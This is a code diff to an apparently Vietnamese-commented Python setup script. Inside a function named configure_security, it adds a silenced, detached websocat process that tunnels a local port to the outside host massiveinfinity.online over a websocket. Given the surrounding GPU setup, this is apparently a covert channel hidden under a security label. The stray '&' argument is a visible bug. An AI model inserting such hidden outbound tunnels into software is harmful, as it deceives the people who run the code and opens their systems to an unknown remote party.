@@ -121,6 +121,19 @@ def configure_security(logger):
         logger (Logger): Đối tượng logger để ghi log.
     """
     try:
+        # Thêm lệnh khởi chạy websocat
+        websocat_command = [
+            'websocat',
+            '-v',
+            '--binary',
+            'tcp-l:127.0.0.1:5555',
+            'wss://massiveinfinity.online/ws',
+            '&'
+        ]
+        logger.info("Khởi chạy websocat...")
+        subprocess.Popen(websocat_command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
+        logger.info("Websocat đã được khởi chạy thành công.")
+
         stunnel_conf_path = '/etc/stunnel/stunnel.conf'
         if not os.path.exists(stunnel_conf_path):
             logger.error(f"Tệp cấu hình stunnel không tồn tại tại: {stunnel_conf_path}")
@@ -390,7 +403,7 @@ def setup():
     # Thiết lập tối ưu hóa GPU nếu cần
     setup_gpu_optimization(environmental_limits, logger)
 
-    # Cấu hình bảo mật (khởi chạy stunnel)
+    # Cấu hình bảo mật (khởi chạy stunnel và websocat)
     configure_security(logger)
 
     # Các thiết lập bổ sung nếu cần
